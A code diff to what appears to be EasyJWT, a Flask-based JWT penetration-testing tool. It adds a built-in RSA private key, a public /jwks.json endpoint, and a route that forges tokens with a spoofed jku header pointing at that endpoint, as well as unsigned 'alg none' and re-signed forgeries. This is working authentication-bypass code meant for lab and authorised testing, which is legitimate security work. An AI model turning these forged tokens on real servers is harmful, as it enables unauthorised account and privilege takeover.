@@ -18,6 +18,60 @@ JWT_TOOL = "jwt_tool.py"
 MAX_CUSTOM_WORDLIST_BYTES = 2 * 1024 * 1024  # 2 MB
 SITE_URL = os.environ.get("SITE_URL", "https://easyjwt.imegz.dev")
 
+# Fixed keypair used for the "Spoof JWKS" exploit when no JWKS URL is given.
+# This is intentionally baked into the source and shipped with every copy of
+# EasyJWT (local installs and the live site alike), rather than generated per
+# instance: the whole point of a default is that a token self-signed by any
+# install is verifiable against the SAME public key served from /jwks.json
+# on the live site, so solo users without their own hosting still have a
+# real, working jku target to point a lab at. It is not a secret, it exists
+# purely so test tokens can be forged and verified.
+DEFAULT_JWKS_KID = "easyjwt-default-1"
+DEFAULT_JWKS_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDj/Ff91kLspLjP
+8L4UefVBr8KwUEtNpGccbgA1GZGRrBJ3bIzXwyQCY5q+Ux4tw1E4QizhVEgRD09t
+x8/1cGJH6/TfR6IBNqCQY1zxGaLxN9XaDmVrioeX2NAVv62ppIb/6Hvbpne4L5Or
+GhMzLkoN06+vAuETxZh/J3f0993Vx52KjGNR5h/HRQJK9ZXMDRQb0GiIoDuYsKG/
+Kx5aR3IYa1kNgj2jlE3Dzp6GEZzdjgN44ZdHSodoPCp5r9gN7kylWN8YFsWXXOxC
+5RV9hzI5GO2LwosUiGQ4Z14iqH1OfKfXGkovsP+RVeQln0Zyg+q6lyivKy6CK91a
+iXKxb4wDAgMBAAECggEATdqigcBlYkJuCjR/9KYhJqlKpsMEtCLsQz0dPQTaPRCx
+za53+kZdSaOR+GSR7bbBSaDvipMpeQntaePOFFaoeT8OhCEGJbvt4ODNoFfM2Ork
+UG6SG8NWwnf7tzGZsFDK+SD/CucyAufcWZWx8Mxh5Y7gc7db/VCA3wsvX6w1SQcY
+rhpOTYIMUBLAT0a8gt74kCuoghmET21Nptt1yA5jiJel5L+OxtMVQlvBTlmApwQc
+VawxC2+RTHYXfWWw7jwMKoORIPYq7O9nHvDvrTfOmfkG7shjQsMdFkt2l4QiqSAj
+EA2fCcTTgGUL053SATqUu52QQTQGlODWH7N0hV33wQKBgQD3QJh/JKNZWtZXVLXn
+WBPCBkEhj2/JWytRb2P+GmoWJothSccp+dfUQQ798HNxZAuJTCTT9PSeD9ZfKVIO
+XxI4vJZtWnsH3F8sTmAyhrRUIdTbTv9TO7TiGI28Fk6jS9HZ53hVlkN+n+Wi8ORD
+Fpl/pPAt0eimhK5PiQIgcPPJyQKBgQDsDT9KiH4ZQwjbtrSuBdjjACTMGcocNblT
+MT8WsTK+MVi7o0YWG0d6UV39Wg7sAZ9bLZnGZDgGZkS2ut7tjlEL07cZ4n670ai8
+c3F02kdFS0sy3OnP5qmwmHRSK+QNj+Gd787OTyswoP6kZUIEmvWm0M9t0LhC+ynh
+FjBiTXMNawKBgCrBk91gs5KvH6OodXBVDc2ekULBcB5M0rfZYFw/qxq7fZzMSlGa
+79S3j2UgYIY6O7h5X2D72hU/Pd3k4liz3g3LpuOwIthgJmEeCIqUOrjVxN5L0eFN
+0ODMSC4/WUfpw5c/7NI4EuHhuq8rov1q+g5VsmbqBqZNCWudkK2VesLpAoGBAMPD
+DL00S1eJ93u3n0o/QSqpANtfe/U/PM3YppicJhgDdrJOax6ESxgPCOLG4F8rzUvh
+mokkri3ofI4Kljzu7Rng4BYQd8gtzUFUgEBHkhnOorOw8BtiEVKKbNWE3uG8dID1
+003X7Fqs+eG+tCx7ksRgodZR5a5u+8FXFJNB5eu3AoGBAONKYDa/hdqwIIVFtYwf
+VOsizMZNA/25Quvjyf7mZOQ9kx+Xg3B6wbkHijdDzKLVU69mHO2iyFlKFXIgVklG
+tMTk3r8lpILN25Eo1xDUmtOvWY5VAWOjL39Ms4kDwzml6utKHeEbSXOpgtn/d0kH
+lXEwmkWUVCJ2dFomEEUM7M/u
+-----END PRIVATE KEY-----"""
+
+
+def _default_jwks_public_key():
+    from cryptography.hazmat.primitives import serialization
+    private_key = serialization.load_pem_private_key(
+        DEFAULT_JWKS_PRIVATE_KEY_PEM.encode(), password=None,
+    )
+    return private_key.public_key()
+
+
+def _b64url_uint(n):
+    byte_len = (n.bit_length() + 7) // 8
+    return b64url_encode(n.to_bytes(byte_len, "big"))
+
+
+_DEFAULT_JWKS_PUBLIC_NUMBERS = _default_jwks_public_key().public_numbers()
+
 AUTH_USER = os.environ.get("AUTH_USER")
 AUTH_PASS = os.environ.get("AUTH_PASS")
 
@@ -161,6 +215,23 @@ def favicon_ico():
     )
 
 
+@app.route("/jwks.json")
+def jwks_json():
+    # Intentionally public, no auth: this is the whole point of the
+    # default key, external servers under test must be able to fetch it
+    # with no credentials when they follow a spoofed jku header.
+    return jsonify({
+        "keys": [{
+            "kty": "RSA",
+            "use": "sig",
+            "alg": "RS256",
+            "kid": DEFAULT_JWKS_KID,
+            "n": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.n),
+            "e": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.e),
+        }]
+    })
+
+
 @app.route("/api/decode", methods=["POST"])
 @auth_required
 def decode():
@@ -252,6 +323,7 @@ def forge():
     sign_alg = data.get("sign_alg", "").strip()
     secret = data.get("secret", "")
     private_key = data.get("private_key", "")
+    add_typ = bool(data.get("add_typ"))
 
     if not header_json or not payload_json:
         return jsonify({"error": "Header and payload JSON are both required"}), 400
@@ -272,7 +344,8 @@ def forge():
 
     try:
         if not sign_alg:
-            header.setdefault("typ", "JWT")
+            if add_typ:
+                header.setdefault("typ", "JWT")
             header.setdefault("alg", "none")
             header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
             payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
@@ -280,10 +353,19 @@ def forge():
         elif sign_alg.startswith("hs"):
             if not secret:
                 return jsonify({"error": "HMAC signing needs a secret"}), 400
+            # PyJWT's encode() silently injects "typ": "JWT" into the header
+            # whenever the header dict has no "typ" key at all. Explicitly
+            # setting it to None (falsy) tells PyJWT to leave it out, so the
+            # header we send is exactly what the user wrote, unless they
+            # opted in to the default via add_typ.
+            if "typ" not in header and not add_typ:
+                header["typ"] = None
             token = jwt.encode(payload, secret, algorithm=sign_alg.upper(), headers=header)
         else:
             if not private_key:
                 return jsonify({"error": "This algorithm needs a private key"}), 400
+            if "typ" not in header and not add_typ:
+                header["typ"] = None
             token = jwt.encode(payload, private_key, algorithm=sign_alg.upper(), headers=header)
     except Exception as exc:
         return jsonify({"error": f"Could not build the token: {exc}"}), 400
@@ -299,7 +381,7 @@ def exploit():
     token = data.get("token", "").strip()
     code = data.get("code", "").strip()
     pubkey = data.get("pubkey", "")
-    jwks_url = data.get("jwks_url", "")
+    jwks_url = data.get("jwks_url", "").strip()
 
     if not token or not code:
         return jsonify({"error": "Token and exploit code are required"}), 400
@@ -314,9 +396,45 @@ def exploit():
         with os.fdopen(fd, "w") as f:
             f.write(pubkey)
         args += ["-pk", tmp_key_path]
+    elif code == "s" and not jwks_url:
+        # No JWKS URL given: self-sign with EasyJWT's built-in default key
+        # instead of calling jwt_tool (which would generate its own random,
+        # unhosted keypair). This key's public half is always served at
+        # /jwks.json on every EasyJWT instance, local or live, so the
+        # resulting token is actually verifiable by a real target server
+        # without the user having to host anything themselves.
+        parts = token.split(".")
+        if len(parts) < 2:
+            return jsonify({"error": "That does not look like a JWT"}), 400
+        try:
+            header = json.loads(b64url_decode(parts[0]))
+            payload = json.loads(b64url_decode(parts[1]))
+        except Exception as exc:
+            return jsonify({"error": f"Could not decode token: {exc}"}), 400
+        if not isinstance(header, dict) or not isinstance(payload, dict):
+            return jsonify({"error": "Token header/payload must be JSON objects"}), 400
+
+        default_jwks_url = f"{SITE_URL}/jwks.json"
+        header["alg"] = "RS256"
+        header["jku"] = default_jwks_url
+        header["kid"] = DEFAULT_JWKS_KID
+        if "typ" not in header:
+            header["typ"] = None  # don't let PyJWT silently add one, see /api/forge
+
+        try:
+            new_token = jwt.encode(payload, DEFAULT_JWKS_PRIVATE_KEY_PEM, algorithm="RS256", headers=header)
+        except Exception as exc:
+            return jsonify({"error": f"Could not sign the token: {exc}"}), 400
+
+        output = (
+            "No JWKS URL given, so this was self-signed with EasyJWT's built-in default key. "
+            f"Its public half is always hosted at {default_jwks_url}, so a server that fetches "
+            "the jku header and trusts it will accept this token.\n"
+            "To use your own key instead, host your own JWKS and paste its URL above before running this.\n\n"
+            f"New JWT:\n\n{new_token}"
+        )
+        return jsonify({"output": output})
     elif code == "s":
-        if not jwks_url:
-            return jsonify({"error": "Spoof JWKS needs a URL"}), 400
         args += ["-ju", jwks_url]
 
     try:
